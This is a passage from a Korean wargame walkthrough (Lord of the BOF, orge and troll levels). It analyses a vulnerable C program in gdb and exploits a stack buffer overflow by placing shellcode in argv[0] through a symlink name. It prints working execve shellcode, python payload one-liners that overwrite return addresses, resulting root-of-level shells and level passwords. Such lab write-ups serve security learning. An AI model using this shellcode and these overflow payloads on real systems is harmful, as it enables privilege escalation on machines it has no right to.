0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	nop
0x8048524 <main+36>:	mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:	nop
0x804852c <main+44>:	lea    %esi,[%esi*1]
0x8048530 <main+48>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:	lea    %edx,[%eax*4]
0x804853a <main+58>:	mov    %eax,%ds:0x80497cc
0x804853f <main+63>:	cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:	jne    0x8048547 <main+71>
0x8048545 <main+69>:	jmp    0x8048587 <main+135>
0x8048547 <main+71>:	mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:	lea    %edx,[%eax*4]
0x8048551 <main+81>:	mov    %eax,%ds:0x80497cc
0x8048556 <main+86>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:	push   %edx
0x804855a <main+90>:	call   0x80483f0 <strlen>
0x804855f <main+95>:	add    %esp,4
0x8048562 <main+98>:	mov    %eax,%eax
0x8048564 <main+100>:	push   %eax
0x8048565 <main+101>:	push   0
0x8048567 <main+103>:	mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:	lea    %edx,[%eax*4]
0x8048571 <main+113>:	mov    %eax,%ds:0x80497cc
0x8048576 <main+118>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:	push   %edx
0x804857a <main+122>:	call   0x8048430 <memset>
0x804857f <main+127>:	add    %esp,12
0x8048582 <main+130>:	inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:	jmp    0x8048530 <main+48>
0x8048587 <main+135>:	mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:	add    %eax,4
0x804858d <main+141>:	mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:	add    %edx,47
0x8048592 <main+146>:	cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:	je     0x80485b0 <main+176>
0x8048597 <main+151>:	push   0x80486a3
0x804859c <main+156>:	call   0x8048410 <printf>
0x80485a1 <main+161>:	add    %esp,4
0x80485a4 <main+164>:	push   0
0x80485a6 <main+166>:	call   0x8048420 <exit>
0x80485ab <main+171>:	add    %esp,4
0x80485ae <main+174>:	mov    %esi,%esi
0x80485b0 <main+176>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:	add    %eax,4
0x80485b6 <main+182>:	mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:	push   %edx
0x80485b9 <main+185>:	call   0x80483f0 <strlen>
0x80485be <main+190>:	add    %esp,4
0x80485c1 <main+193>:	mov    %eax,%eax
0x80485c3 <main+195>:	cmp    %eax,48
0x80485c6 <main+198>:	jbe    0x80485e0 <main+224>
0x80485c8 <main+200>:	push   0x80486c0
0x80485cd <main+205>:	call   0x8048410 <printf>
0x80485d2 <main+210>:	add    %esp,4
0x80485d5 <main+213>:	push   0
0x80485d7 <main+215>:	call   0x8048420 <exit>
0x80485dc <main+220>:	add    %esp,4
0x80485df <main+223>:	nop
0x80485e0 <main+224>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485e3 <main+227>:	add    %eax,4
0x80485e6 <main+230>:	mov    %edx,DWORD PTR [%eax]
0x80485e8 <main+232>:	push   %edx
0x80485e9 <main+233>:	lea    %eax,[%ebp-40]
0x80485ec <main+236>:	push   %eax
0x80485ed <main+237>:	call   0x8048440 <strcpy>
0x80485f2 <main+242>:	add    %esp,8
0x80485f5 <main+245>:	lea    %eax,[%ebp-40]
0x80485f8 <main+248>:	push   %eax
0x80485f9 <main+249>:	push   0x80486d7
0x80485fe <main+254>:	call   0x8048410 <printf>
0x8048603 <main+259>:	add    %esp,8
0x8048606 <main+262>:	push   40
0x8048608 <main+264>:	push   0
0x804860a <main+266>:	lea    %eax,[%ebp-40]
0x804860d <main+269>:	push   %eax
0x804860e <main+270>:	call   0x8048430 <memset>
0x8048613 <main+275>:	add    %esp,12
0x8048616 <main+278>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048619 <main+281>:	add    %eax,4
0x804861c <main+284>:	mov    %edx,DWORD PTR [%eax]
0x804861e <main+286>:	push   %edx
0x804861f <main+287>:	call   0x80483f0 <strlen>
0x8048624 <main+292>:	add    %esp,4
0x8048627 <main+295>:	mov    %eax,%eax
0x8048629 <main+297>:	push   %eax
0x804862a <main+298>:	push   0
0x804862c <main+300>:	mov    %eax,DWORD PTR [%ebp+12]
0x804862f <main+303>:	add    %eax,4
0x8048632 <main+306>:	mov    %edx,DWORD PTR [%eax]
0x8048634 <main+308>:	push   %edx
0x8048635 <main+309>:	call   0x8048430 <memset>
0x804863a <main+314>:	add    %esp,12
0x804863d <main+317>:	leave
0x804863e <main+318>:	ret
0x804863f <main+319>:	nop
```
여기서 부터 재밌는게 이 문제는 argv[0]에 쉘 코드를 입력하여, 풀어야 한다.
b *main+3 정도에 브프를 걸고 x/1000s $esp 시
특정 메모리 영역에서 부터 환경 변수가 노출되게 된다.
```
0xbffffe29:	 "i686"
0xbffffe2e:	 "/tmp/troll"
0xbffffe39:	 "123"
0xbffffe3d:	 "PWD=/home/orge"
0xbffffe4c:	 "REMOTEHOST=192.168.248.1"
0xbffffe65:	 "HOSTNAME=localhost.localdomain"
0xbffffe84:	 "LESSOPEN=|/usr/bin/lesspipe.sh %s"
---Type <return> to continue, or q <return> to quit---
0xbffffea6:	 "USER=orge"
0xbffffeb0:	 "LS_COLORS="
0xbffffebb:	 "MACHTYPE=i386-redhat-linux-gnu"
0xbffffeda:	 "MAIL=/var/spool/mail/orge"
0xbffffef4:	 "INPUTRC=/etc/inputrc"
0xbfffff09:	 "BASH_ENV=/home/orge/.bashrc"
0xbfffff25:	 "LANG=en_US"
0xbfffff30:	 "LOGNAME=orge"
0xbfffff3d:	 "SHLVL=1"
0xbfffff45:	 "SHELL=/bin/bash2"
0xbfffff56:	 "USERNAME="
0xbfffff60:	 "HOSTTYPE=i386"
0xbfffff6e:	 "OSTYPE=linux-gnu"
0xbfffff7f:	 "HISTSIZE=1000"
0xbfffff8d:	 "TERM=xterm-256color"
0xbfffffa1:	 "HOME=/home/orge"
0xbfffffb1:	 "PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/orge/bin"
0xbffffff1:	 "/tmp/troll"
```
이 주소는 egghunter 함수에 의해서 초기화가 된다. 확인을 해보면 아래와 같다.

```
(gdb) r `python -c 'print "A"*47+"\xbf"'`
Starting program: /tmp/troll `python -c 'print "A"*47+"\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
```
이런식으로 segmentation fault를 유도하고 다시 메모리 확인해보자.

```
0xbffffdfc:	 "i686"
0xbffffe01:	 "/tmp/troll"
```
우리가 입력한 argv[0]의 값이 메모리에 그대로 남게 되는데, 메모리 주소는 변경된다.... 무튼


### 3. exploit code
```
cp troll /tmp/troll
gdb -q /tmp/troll

b *main+317
r `python -c 'print "A"*44+"BBB\xbf"'`
x/10000s $esp
```
위와 같이 입력 시 argv[0]의 위치를 알 수 있다.

```
0xbffffdfc:	 "i686"
0xbffffe01:	 "/tmp/troll"
0xbffffff1:	 "/tmp/troll"
```

argv[0]인 /tmp/troll의 위치는 0xbffffe01, 0xbffffff1

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
여기에 위의 쉘 코드를 넣게 되면 어떨까?

```
cp  ~/troll `python -c 'print  "\x90"*200+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
```
위와 같이 파일 복사

```
./`python -c 'print  "\x90"*200+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`
```
파일 실행을 하면 segment 오류가 발생한다.
gdb -q -c core 명령어를 이용하여 x/1000s $esp 를 확인해 본다.

```
0xbffffb24:	 "./", '\220' <repeats 198 times>..
0xbfffff01:	 "./", '\220' <repeats 198 times>...
```

nop을 많이 넣게 되고 마지막 argv[0] 값이 커널 메모리를 건드리므로 오류가 발생한다.

```
./`python -c 'print  "\x90"*200+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` `python -c 'print "A"*44+"\x24\xfb\xff\xbf"'`
```

argv[0]이 담겨져 있는 메모리의 주소를 RET 부분에 덮어 씌우면 쉘이 뜨게 된다.

```
bash$ id
uid=507(orge) gid=507(orge) groups=507(orge)
bash$ my-pass
euid = 507
timewalker
```

하지만... 이렇게 되기 때문에 현재의 권한을 위해 심볼링 링크를 걸어줘야 한다.

```
ln -sf ~/troll `python -c 'print  "\x90"*200+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`*

./`python -c 'print  "\x90"*200+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`* `python -c 'print "A"*44+"\x24\xfb\xff\xbf"'`
```

이렇게 payload를 입력하게 되면!!!

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$���
bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
bash$ my-pass
euid = 508
aspirin
```
드디어 성공.... 개삽질했다 이번껀은...너무 힘들었음

명령어 옵션은 아래의 참고한 블로그 내용을 보면 알 수 있다.

ln 사용 시 -f 는 파일이 존재해도 무시하는 옵션이고, ``를 닫고 *를 쓴 것은, *을 와일드 카드로 사용한 것이다.

rm *를 하면 디렉토리 내 모든 파일을 삭제하는 명령이듯이, \x90로 시작하는 모든 파일을 가리키는 것이다.

링크할 때도, 실행할 때도 저렇게 사용할 수 있다.

그리고 RET 영역을 0xbffff946으로 변조해도 쉘이 잘 실행된다. './'을 기계어로 취급하여 수행해도 쉘코드 실행에 문제가 되지 않기 때문이다.

출처: http://ssaemo.tistory.com/19 [뾰족뾰족]

## troll

### 1. source code
```
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
	char buffer[40];

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

### 2. gdb
### 3. exploit code
